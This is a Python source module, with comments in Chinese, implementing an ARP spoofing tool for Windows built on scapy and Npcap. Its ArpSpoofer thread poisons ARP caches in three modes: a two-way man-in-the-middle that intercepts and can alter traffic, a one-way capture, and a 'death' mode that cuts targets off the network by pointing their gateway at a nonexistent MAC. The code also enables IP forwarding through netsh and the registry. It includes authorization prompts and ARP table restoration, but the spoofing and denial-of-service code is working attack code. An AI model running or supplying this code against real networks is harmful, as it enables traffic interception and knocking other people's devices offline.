# -*- coding: utf-8 -*-
"""
ARP 流量牵引（ARP 中间人测试）
==============================

用途：在**你自己拥有或已获书面授权**的网络里，把指定设备的流量牵引到本机，
配合 Wireshark 分析协议行为、排查异常流量、验证 ARP 防护是否生效。

工作原理
--------
对目标主机冒充网关、对网关冒充目标主机，让对方把发往 Internet 的帧都发到本机：

    受害者 ──(以为发给网关)──> 本机 ──(转发)──> 真实网关 ──> Internet

安全设计（重要）
----------------
* **停止时自动恢复 ARP 表**：把正确映射连发多次，让对方立刻恢复；
* 程序退出 / 异常退出时也会尽力恢复（UI 侧注册了 atexit）；
* 需要管理员权限 + Npcap，且必须在界面里先确认「已获得授权」；
* 单向模式（只对目标冒充网关）不会转发流量，目标会断网 —— 仅用于抓包场景，
  界面上有明确警告。

IP 转发
-------
Windows 需要开启 IP 转发才能让流量继续出去，否则目标会断网。
本模块优先用 `netsh interface ipv4 set interface <网卡> forwarding=enabled`，
并同步设置注册表 IPEnableRouter=1。
"""

from __future__ import annotations

import re
import threading
import time
from dataclasses import dataclass, field

from .hostinfo import Iface, is_admin, run_hidden
from .logging_bus import log


# --------------------------------------------------------------------------- #
# IP 转发控制
# --------------------------------------------------------------------------- #

def _read_ipenable_router() -> int | None:
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters") as k:
            v, _ = winreg.QueryValueEx(k, "IPEnableRouter")
            return int(v)
    except Exception:
        return None


def _write_ipenable_router(value: int) -> bool:
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "IPEnableRouter", 0, winreg.REG_DWORD, value)
        return True
    except Exception as exc:
        log(f"写注册表 IPEnableRouter 失败：{exc}", "debug", "arpmitm")
        return False


def forwarding_status(alias: str = "") -> bool | None:
    """
    查询 IP 转发状态。优先看指定网卡的 Forwarding 字段，读不到就看注册表。
    返回 True/False，未知返回 None。
    """
    if alias:
        out = run_hidden(["netsh", "interface", "ipv4", "show", "interface", alias])
        m = re.search(r"Forwarding\s*:\s*(\S+)", out, re.I)
        if m:
            return m.group(1).strip().lower() in ("enabled", "yes", "已启用", "是")
    v = _read_ipenable_router()
    return None if v is None else bool(v)


def enable_forwarding(alias: str = "") -> tuple[bool, str]:
    """开启 IP 转发（需要管理员）。"""
    if not is_admin():
        return False, "开启 IP 转发需要管理员权限"
    msgs = []
    ok = False

    if alias:
        out = run_hidden(["netsh", "interface", "ipv4", "set", "interface",
                          alias, "forwarding=enabled"])
        low = out.lower()
        if "elevation" in low or "拒绝" in out or "denied" in low:
            msgs.append(f"netsh: {out.strip()[:120]}")
        else:
            ok = True
            msgs.append(f"netsh 已对「{alias}」开启 forwarding")

    if _write_ipenable_router(1):
        ok = True
        msgs.append("注册表 IPEnableRouter=1")

    if not ok:
        msgs.append("未能开启转发：目标设备可能断网，请谨慎使用")
    return ok, "；".join(msgs)


def disable_forwarding(alias: str = "") -> tuple[bool, str]:
    """关闭 IP 转发（恢复原状）。"""
    if not is_admin():
        return False, "关闭 IP 转发需要管理员权限"
    msgs = []
    if alias:
        run_hidden(["netsh", "interface", "ipv4", "set", "interface",
                    alias, "forwarding=disabled"])
        msgs.append(f"netsh 已关闭「{alias}」forwarding")
    if _write_ipenable_router(0):
        msgs.append("注册表 IPEnableRouter=0")
    return True, "；".join(msgs)


# --------------------------------------------------------------------------- #
# MAC 解析
# --------------------------------------------------------------------------- #

def resolve_own_mac(iface: Iface) -> str:
    """
    取本机在这块网卡上的 MAC。

    绝不允许返回全零地址：全零源 MAC 的以太帧会被 AP / 网卡直接丢弃，
    表现就是「ARP 牵引看起来在跑，但对面一点反应都没有」。
    """
    mac = (getattr(iface, "mac", "") or "").strip().lower()
    if mac and mac != "00:00:00:00:00:00":
        return mac
    try:
        from scapy.all import conf, get_if_hwaddr
        target = getattr(iface, "l2_name", "") or conf.iface
        mac = (get_if_hwaddr(target) or "").lower()
        if mac and mac != "00:00:00:00:00:00":
            log(f"网卡对象没有 MAC，已从 scapy 取到 {mac}", "info", "arpmitm")
            return mac
    except Exception as exc:
        log(f"解析本机 MAC 失败：{type(exc).__name__}: {exc}", "warn", "arpmitm")
    return ""


def send_selftest(iface: Iface, gateway_ip: str, victims: list[str] | None = None,
                  expected: dict[str, str] | None = None,
                  timeout: float = 3.0) -> dict:
    """
    无害发包自检（需要管理员）：

      1) 本机网卡 MAC 能否取到（取不到就发不出有效的帧）
      2) 构造的 Npcap 设备名是否出现在真实设备列表中
      3) 向网关发一个**普通 ARP 请求**，看能否收到应答 —— 验证收发链路
      4) ping 一下目标，验证二层单播能否送达对方
         （ping 不通通常意味着 AP/交换机启用了客户端隔离，此时 ARP 牵引同样无法生效）
      5) 重新解析目标的真实 MAC，与目标表中的填写值比对
         （MAC 不一致时数据包会发往其他设备，欺骗会静默失效）

    全程只发正常的 ARP 请求，**不做任何欺骗**，不会影响局域网里任何设备。
    """
    result: dict = {"ok": False, "steps": [], "gateway_mac": "", "ping_ok": None}
    expected = {k: (v or "").lower() for k, v in (expected or {}).items()}

    def step(name, ok, detail):
        result["steps"].append({"name": name, "ok": bool(ok), "detail": detail})

    mac = resolve_own_mac(iface)
    step("本机网卡 MAC", bool(mac), mac or "取不到 MAC —— 帧会被丢弃，发不出去")
    if not mac:
        return result

    try:
        from scapy.all import get_if_list
        devs = [d.lower() for d in get_if_list()]
        hit = (iface.l2_name or "").lower() in devs
        step("Npcap 设备名", hit,
             (iface.l2_name or "(空)") + ("  ✓ 匹配" if hit else "  ✗ 不在设备列表里"))
    except Exception as exc:
        step("Npcap 设备名", False, f"{type(exc).__name__}: {exc}")

    try:
        from scapy.all import ARP, Ether
        from .rawsock import srp_locked
        pkt = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
               / ARP(op=1, psrc=iface.ip, pdst=gateway_ip))
        ans, _ = srp_locked(pkt, iface.l2_name or "", timeout)
        if ans:
            gw_mac = ans[0][1].hwsrc
            result["gateway_mac"] = gw_mac
            step("向网关发 ARP 请求", True, f"收到应答：{gateway_ip} 是 {gw_mac}")
        else:
            step("向网关发 ARP 请求", False,
                 f"{timeout:.0f}s 内无应答 —— 包可能没发出去，或网关不回 ARP")
    except Exception as exc:
        step("向网关发 ARP 请求", False, f"{type(exc).__name__}: {exc}")

    if victims:
        from .assets import ping_one
        target = victims[0]
        rtt = ping_one(target, 1500)
        result["ping_ok"] = rtt is not None
        step(f"ping 目标 {target}", rtt is not None,
             (f"通了（{rtt:.0f} ms）—— 二层单播正常，AP 没做客户端隔离"
              if rtt is not None else
              "不通 —— 可能对方开了防火墙，或者 AP/交换机做了客户端隔离；"
              "这种情况下 ARP 牵引不可能生效"))

        # 校验目标 MAC
        try:
            from scapy.all import ARP, Ether
            from .rawsock import srp_locked
            for ip in victims[:5]:
                real = ""
                try:
                    ans, _ = srp_locked(
                        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
                        / ARP(op=1, psrc=iface.ip, pdst=ip),
                        iface.l2_name or "", 2.0)
                    if ans:
                        real = (ans[0][1].hwsrc or "").lower()
                except Exception:
                    pass
                want = expected.get(ip, "")
                if not real:
                    step(f"目标 {ip} 的 MAC", False,
                         "问不到（对方可能不在线/防火墙拦了 ARP）")
                elif not want:
                    step(f"目标 {ip} 的 MAC", True, f"解析结果 {real}（目标表里未填写）")
                elif real == want:
                    step(f"目标 {ip} 的 MAC", True, f"{real} ✓ 与目标表一致")
                else:
                    step(f"目标 {ip} 的 MAC", False,
                         f"解析结果是 {real}，但目标表中填写的是 {want}；"
                         f"MAC 不一致会导致数据包发往其他设备，欺骗无效，请更正")
        except Exception as exc:
            step("校验目标 MAC", False, f"{type(exc).__name__}: {exc}")

    result["ok"] = all(s["ok"] for s in result["steps"])
    return result


def resolve_mac(ip: str, l2_name: str = "", timeout: float = 2.0) -> str:
    """查 IP 对应的 MAC：先查本机 ARP 缓存，再用 scapy 主动问一次。"""
    from .assets import arp_table
    mac = arp_table().get(ip, "")
    if mac and mac != "ff:ff:ff:ff:ff:ff":
        return mac
    if not is_admin():
        return ""
    try:
        from scapy.all import ARP, Ether
        from .rawsock import srp_locked
        ans, _ = srp_locked(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                            l2_name or "", timeout)
        for _s, r in ans:
            return (r.hwsrc or "").lower()
    except Exception as exc:
        log(f"解析 {ip} 的 MAC 失败：{exc}", "debug", "arpmitm")
    return ""


# --------------------------------------------------------------------------- #
# 流量牵引
# --------------------------------------------------------------------------- #

@dataclass
class SpoofTarget:
    ip: str
    mac: str
    name: str = ""

    def label(self) -> str:
        return f"{self.ip} ({self.name})" if self.name else self.ip


@dataclass
class SpoofStats:
    running: bool = False
    arp_sent: int = 0
    rounds: int = 0
    started_at: float = 0.0
    last_error: str = ""
    targets: int = 0
    mode: str = "two_way"          # two_way / one_way / death
    forwarding: bool | None = None
    victim_packets: int = 0                              # 来自目标的包数（判断牵引是否生效）
    victim_seen: dict = field(default_factory=dict)      # {ip: 包数}

    @property
    def mode_label(self) -> str:
        return {"two_way": "双向中间人", "one_way": "单向抓包",
                "death": "断网攻击"}.get(self.mode, self.mode)

    @property
    def uptime(self) -> str:
        if not self.started_at:
            return "00:00:00"
        s = int(time.time() - self.started_at)
        h, r = divmod(s, 3600)
        m, sec = divmod(r, 60)
        return f"{h:02d}:{m:02d}:{sec:02d}"


# 断网模式用的假 MAC（这个地址不存在，流量发出去就是黑洞）
BOGUS_MAC = "de:ad:be:ef:00:01"


class ArpSpoofer(threading.Thread):
    """
    ARP 流量牵引线程。三种模式：

    two_way  双向中间人：目标 ↔ 本机 ↔ 网关。配合 IP 转发，目标不断网，
             流量会经过本机，可以抓包 / 改包。
    one_way  单向抓包：只对目标冒充网关。目标的上行会到本机，但不转发，
             目标会断网（只适合快速抓一段）。
    death    断网攻击：告诉目标「网关在一个不存在的 MAC 上」，
             流量直接进黑洞，目标上不了网（CTF 里常说的 arp death）。

    stop() 会先恢复 ARP 表再结束线程 —— 三种模式都会恢复。
    """

    def __init__(self, iface: Iface, gateway_ip: str, gateway_mac: str,
                 targets: list[SpoofTarget], mode: str = "two_way",
                 interval: float = 1.5, restore_count: int = 5,
                 on_stat=None) -> None:
        super().__init__(daemon=True, name="ArpSpoofer")
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.gateway_mac = (gateway_mac or "").lower()
        self.targets = targets
        self.mode = mode if mode in ("two_way", "one_way", "death") else "two_way"
        self.interval = max(0.3, interval)
        self.restore_count = max(1, restore_count)
        self.on_stat = on_stat
        self._stop_evt = threading.Event()
        self._restored = threading.Event()
        self.stats = SpoofStats(targets=len(targets), mode=self.mode)
        self.our_mac = resolve_own_mac(iface)
        self.poison_mac = BOGUS_MAC if self.mode == "death" else self.our_mac
        self._sniffer = None

    # ---------------- 发包 ----------------

    def _spoof_pkts(self) -> list:
        """
        构造欺骗包。

        ★ 必须显式写 Ether(src=...)：scapy 的 SourceMACField 是按「包自己的路由」
        去取源 MAC 的（pkt.route()[0]），**不会**用 sendp() 传的 iface。
        不写 src 的话，源 MAC 会变成 conf.iface（本机常常是 Loopback）的
        00:00:00:00:00:00 —— 全零源 MAC 的帧会被 AP/网卡直接丢弃，
        ARP 欺骗会完全无效（death 也踢不掉别人）。
        """
        from scapy.all import ARP, Ether
        pkts = []
        for t in self.targets:
            if not t.mac:
                continue
            # 告诉目标：网关的 IP 在这个 MAC 上（双向/单向=本机，断网=黑洞）
            pkts.append(Ether(src=self.our_mac, dst=t.mac)
                        / ARP(op=2, psrc=self.gateway_ip,
                              hwsrc=self.poison_mac,
                              pdst=t.ip, hwdst=t.mac))
            if self.mode == "two_way":
                # 告诉网关：目标的 IP 在本机 MAC 上
                pkts.append(Ether(src=self.our_mac, dst=self.gateway_mac)
                            / ARP(op=2, psrc=t.ip,
                                  hwsrc=self.our_mac,
                                  pdst=self.gateway_ip, hwdst=self.gateway_mac))
        return pkts

    def _restore_pkts(self) -> list:
        from scapy.all import ARP, Ether
        pkts = []
        for t in self.targets:
            if not t.mac:
                continue
            # 把网关的正确 MAC 还给目标（三种模式都要还）
            pkts.append(Ether(src=self.our_mac, dst=t.mac)
                        / ARP(op=2, psrc=self.gateway_ip,
                              hwsrc=self.gateway_mac,
                              pdst=t.ip, hwdst=t.mac))
            if self.mode == "two_way":
                # 把目标的正确 MAC 还给网关
                pkts.append(Ether(src=self.our_mac, dst=self.gateway_mac)
                            / ARP(op=2, psrc=t.ip,
                                  hwsrc=t.mac,
                                  pdst=self.gateway_ip, hwdst=self.gateway_mac))
        return pkts

    def _send(self, pkts: list) -> int:
        if not pkts:
            return 0
        # 用常驻句柄发，不要用 sendp()（它每次都开关一次 Npcap 设备，
        # 和常驻嗅探器叠加时容易在 wpcap.dll 里崩）
        from .rawsock import send_packets
        return send_packets(pkts, self.iface.l2_name or "")

    # ---------------- 目标流量计数（判断牵引到底生效没有） ----------------

    def _start_counter(self) -> None:
        """
        抓一下「来自目标设备的包」。

        这是判断 ARP 牵引有没有真正生效的最直接指标：
          * 一直 0  -> 对方根本没把流量发过来（牵引没生效：MAC 不对、
                      交换机/AP 做了客户端隔离、对方有 ARP 防护……）
          * 有数字  -> 牵引成功，流量确实经过本机了
        """
        ips = [t.ip for t in self.targets if t.ip][:20]
        if not ips:
            return
        expr = " or ".join(f"src host {ip}" for ip in ips)
        try:
            from scapy.all import AsyncSniffer
            self._sniffer = AsyncSniffer(iface=self.iface.l2_name or None,
                                         filter=expr, prn=self._count_victim,
                                         store=False)
            self._sniffer.start()
            log("已开始统计目标流量（用来判断牵引是否生效）", "info", "arpmitm")
        except Exception as exc:
            log(f"目标流量统计启动失败（不影响牵引本身）：{type(exc).__name__}: {exc}",
                "debug", "arpmitm")
            self._sniffer = None

    def _count_victim(self, pkt) -> None:
        try:
            src = pkt["IP"].src if pkt.haslayer("IP") else ""
        except Exception:
            src = ""
        self.stats.victim_packets += 1
        if src:
            self.stats.victim_seen[src] = self.stats.victim_seen.get(src, 0) + 1

    def _stop_counter(self) -> None:
        if self._sniffer is not None:
            try:
                self._sniffer.stop()
            except Exception:
                pass
            self._sniffer = None

    # ---------------- 线程体 ----------------

    def run(self) -> None:
        self.stats.running = True
        self.stats.started_at = time.time()
        self.stats.forwarding = forwarding_status(self.iface.alias)

        # 没有本机 MAC 就绝对不能发：源 MAC 全零的帧会被丢掉，等于白干
        if not self.our_mac:
            self.stats.last_error = ("拿不到本机网卡 MAC，无法发包"
                                     "（请确认以管理员运行且 Npcap 可用）")
            self.stats.running = False
            log(self.stats.last_error, "error", "arpmitm")
            if self.on_stat:
                self.on_stat(self.stats)
            return

        log(f"ARP 牵引开始：{len(self.targets)} 个目标 · {self.stats.mode_label}"
            f" · 网关 {self.gateway_ip} · 本机 MAC {self.our_mac}"
            f" · 出口网卡 {self.iface.l2_name or '(默认)'}", "warn", "arpmitm")
        if self.mode == "one_way":
            log("单向模式：目标主机会断网（只抓包，不转发）", "warn", "arpmitm")
        if self.mode == "death":
            log("断网模式：目标的网关被指向不存在的 MAC，它会直接掉线；"
                "停止时会自动恢复", "warn", "arpmitm")
        if self.mode == "two_way" and not self.stats.forwarding:
            log("IP 转发未开启：流量不会转发出去，目标可能会断网", "warn", "arpmitm")

        self._start_counter()

        try:
            while not self._stop_evt.is_set():
                try:
                    self.stats.arp_sent += self._send(self._spoof_pkts())
                    self.stats.rounds += 1
                    self.stats.last_error = ""
                except Exception as exc:
                    self.stats.last_error = f"{type(exc).__name__}: {exc}"
                    log(f"发送 ARP 失败：{self.stats.last_error}", "error", "arpmitm")
                    time.sleep(1.0)
                self._stop_evt.wait(self.interval)
        finally:
            self.stats.running = False
            self._stop_counter()
            self._do_restore()
            if self.on_stat:
                self.on_stat(self.stats)

    def _do_restore(self) -> None:
        if self._restored.is_set():
            return
        self._restored.set()
        try:
            pkts = self._restore_pkts()
            for _ in range(self.restore_count):
                self._send(pkts)
                time.sleep(0.25)
            log(f"已恢复 {len(self.targets)} 个目标的 ARP 表（each ×{self.restore_count}）",
                "success", "arpmitm")
        except Exception as exc:
            log(f"恢复 ARP 表失败（请稍后手动恢复或重启目标网络）：{exc}", "error", "arpmitm")

    def stop(self, timeout: float = 8.0) -> None:
        """停止并等待恢复完成。"""
        self._stop_evt.set()
        if self.is_alive():
            self.join(timeout=timeout)
        if self.is_alive():
            log("牵引线程未在超时内退出，仍会继续尝试恢复", "warn", "arpmitm")

    def restore_now(self) -> None:
        """紧急恢复：立刻把正确映射发回去。"""
        try:
            self._send(self._restore_pkts())
            log("已执行紧急恢复", "success", "arpmitm")
        except Exception as exc:
            log(f"紧急恢复失败：{exc}", "error", "arpmitm")


# --------------------------------------------------------------------------- #
# 退出兜底
# --------------------------------------------------------------------------- #

_ACTIVE: list[ArpSpoofer] = []


def register(spoofer: ArpSpoofer) -> None:
    _ACTIVE.append(spoofer)


def unregister(spoofer: ArpSpoofer) -> None:
    if spoofer in _ACTIVE:
        _ACTIVE.remove(spoofer)


def emergency_restore_all() -> None:
    """程序退出时把还活着的牵引全部恢复，避免把人家的网搞断。"""
    for sp in list(_ACTIVE):
        try:
            sp.stop(timeout=5)
        except Exception:
            pass
        try:
            sp.restore_now()
        except Exception:
            pass
    _ACTIVE.clear()
